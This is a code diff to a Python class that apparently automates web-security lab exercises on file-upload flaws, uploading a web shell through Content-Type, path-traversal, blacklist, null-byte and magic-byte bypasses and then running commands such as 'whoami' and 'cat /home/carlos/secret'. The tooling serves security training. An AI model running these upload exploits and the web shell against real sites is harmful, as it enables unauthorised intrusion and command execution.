@@ -98,12 +98,9 @@ class FileUpload:
             exploit_url = f"{self.url}/files/{self.file_name}"
         else:
             exploit_url = f"{self.url}/files/avatars/{self.file_name}"
-        solve_lab = payload_injection.start_payload(exploit_url, "cat /home/carlos/secret") #testing if exploit works
-        if solve_lab is None:
+        if payload_injection.start_payload(exploit_url, "whoami")  is None: #testing if exploit works
             print("Web shell verification failed")
             return False
-        
-        is_solved = self.session.post(url=f"{self.url}/submitSolution", data={"answer":solve_lab})
         
         print("Exploitation was successfull, The web shell has spawned.\nSide note: To stop just type stop.")
         while True:
@@ -148,6 +145,7 @@ class FileUpload:
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf)
         exploit_condition = self.exploit(file_upload_post)
+        self.solve_tutorial(exploit_condition=exploit_condition,type_of_exploit="simple_file_upload", burpsuite=False)
         if not is_success(self):
             return False
         return exploit_condition
@@ -158,6 +156,7 @@ class FileUpload:
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf, "image/png")
         exploit_condition = self.exploit(file_upload_post)
+        self.solve_tutorial(exploit_condition=exploit_condition, type_of_exploit="content_type", burpsuite=True)
         if not is_success(self):
             return False
         return exploit_condition
@@ -167,6 +166,7 @@ class FileUpload:
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf, path_traversal=True)
         exploit_condition = self.exploit(file_upload_post, path_traversal=True)
+        self.solve_tutorial(exploit_condition=exploit_condition, type_of_exploit="path_traversal", burpsuite=True)
         if not is_success(self):
             return False
         return exploit_condition
@@ -218,6 +218,7 @@ class FileUpload:
                 break
             except Exception as e:
                 print(f"Error: {e}")
+        self.solve_tutorial(exploit_condition=True, type_of_exploit="blacklist_bypass", burpsuite=True)
         if not is_success(self):
             return False
         return True
@@ -227,8 +228,8 @@ class FileUpload:
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf, obsfucated_extension=True)
         exploit_condition = self.exploit(file_upload_post)
+        self.solve_tutorial(exploit_condition=exploit_condition, type_of_exploit="null_byte", burpsuite=True)
         if not is_success(self):
-            print('hi')
             return False
         return exploit_condition
     
@@ -237,6 +238,7 @@ class FileUpload:
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
         file_upload_post = self.file_upload(csrf, magic_byte=True)
         exploit_condition = self.exploit(file_upload_post)
+        self.solve_tutorial(exploit_condition=exploit_condition, type_of_exploit="magic_byte", burpsuite=True)
         if not is_success(self):
             return False
         return exploit_condition
@@ -262,22 +264,18 @@ class FileUpload:
             print(f"Error: Network request failed - {e}")
         
         exploit_methods = [
-        ("Simple file upload", self.simple_file_upload, "simple_file_upload"),
-        ("Content-Type bypass", self.content_type_file_upload, "content_type"),
-        ("Path traversal", self.path_traversal, "path_traversal"),
-        ("Blacklist bypass", self.blacklist_bypass, "blacklist_bypass"),
-        ("Null byte injection", self.null_byte_injection, "null_byte"),
-        ("Magic byte upload", self.magic_byte_file_upload, "magic_byte")
+        ("Simple file upload", self.simple_file_upload),
+        ("Content-Type bypass", self.content_type_file_upload),
+        ("Path traversal", self.path_traversal),
+        ("Blacklist bypass", self.blacklist_bypass),
+        ("Null byte injection", self.null_byte_injection),
+        ("Magic byte upload", self.magic_byte_file_upload)
         ]
 
-        for method_name, method, tutorial_name in exploit_methods:
+        for method_name, method in exploit_methods:
             try:
                 if method():
-                    burpsuite = False
                     print(f"Success with {method_name}")
-                    if tutorial_name != "simple_file_upload":
-                        burpsuite=True
-                    self.solve_tutorial(exploit_condition=True, type_of_exploit=tutorial_name, burpsuite=burpsuite)
                     print("Bye bye ˙◠˙")
                     return True
             except Exception as e:
